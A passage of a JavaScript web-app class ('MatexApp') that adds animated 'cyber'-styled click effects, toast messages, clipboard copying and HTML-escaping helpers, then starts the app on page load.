    let container = document.getElementById('cyber-click-container');
    if (!container) {
      container = document.createElement('div');
      container.id = 'cyber-click-container';
      container.className = 'cyber-click-container';
      document.body.appendChild(container);
    }

    const handleClick = (e) => {
      const x = e.clientX;
      const y = e.clientY;

      if (window.matexBackground) {
        window.matexBackground.triggerClickEffect(x, y);
      }

      const pulse = document.createElement('div');
      pulse.className = 'cyber-click-pulse';
      pulse.style.left = `${x}px`;
      pulse.style.top = `${y}px`;

      const ring = document.createElement('div');
      ring.className = 'cyber-click-ring';
      pulse.appendChild(ring);

      const echo = document.createElement('div');
      echo.className = 'cyber-click-echo';
      pulse.appendChild(echo);

      const target = document.createElement('div');
      target.className = 'cyber-click-target';
      pulse.appendChild(target);

      const sparkCount = 8;
      const radius = 28 + Math.random() * 14;
      for (let i = 0; i < sparkCount; i++) {
        const angle = (2 * Math.PI * i) / sparkCount + (Math.random() - 0.5) * 0.4;
        const dx = Math.cos(angle) * radius;
        const dy = Math.sin(angle) * radius;
        const spark = document.createElement('div');
        spark.className = 'cyber-click-spark';
        spark.style.setProperty('--dx', `${dx.toFixed(1)}px`);
        spark.style.setProperty('--dy', `${dy.toFixed(1)}px`);
        pulse.appendChild(spark);
      }

      container.appendChild(pulse);

      setTimeout(() => {
        if (pulse.parentNode) {
          pulse.parentNode.removeChild(pulse);
        }
      }, 700);
    };

    window.addEventListener('pointerdown', handleClick, { passive: true });
  }

  // =========================================================================
  // UTILITIES & TOASTS
  // =========================================================================
  showToast(message) {
    const toast = document.getElementById('cyber-toast');
    const msgEl = document.getElementById('toast-message');
    if (!toast || !msgEl) return;

    msgEl.textContent = message;
    toast.classList.add('show');

    clearTimeout(this.toastTimeout);
    this.toastTimeout = setTimeout(() => {
      toast.classList.remove('show');
    }, 2800);
  }

  copyToClipboard(text) {
    if (navigator.clipboard && navigator.clipboard.writeText) {
      navigator.clipboard.writeText(text).then(() => {
        this.showToast('Copied to clipboard');
      }).catch(() => {
        this.fallbackCopy(text);
      });
    } else {
      this.fallbackCopy(text);
    }
  }

  fallbackCopy(text) {
    const ta = document.createElement('textarea');
    ta.value = text;
    document.body.appendChild(ta);
    ta.select();
    document.execCommand('copy');
    document.body.removeChild(ta);
    this.showToast('Copied to clipboard');
  }

  escapeHtml(str) {
    if (!str) return '';
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#039;');
  }

  escapeQuotes(str) {
    if (!str) return '';
    return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'").replace(/"/g, '&quot;').replace(/\n/g, '\\n');
  }
}

// Global initialization
if (typeof window !== 'undefined') {
  const initApp = () => {
    window.matexApp = new MatexApp();
  };

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', initApp);
  } else {
    initApp();
  }
}

export default MatexApp;
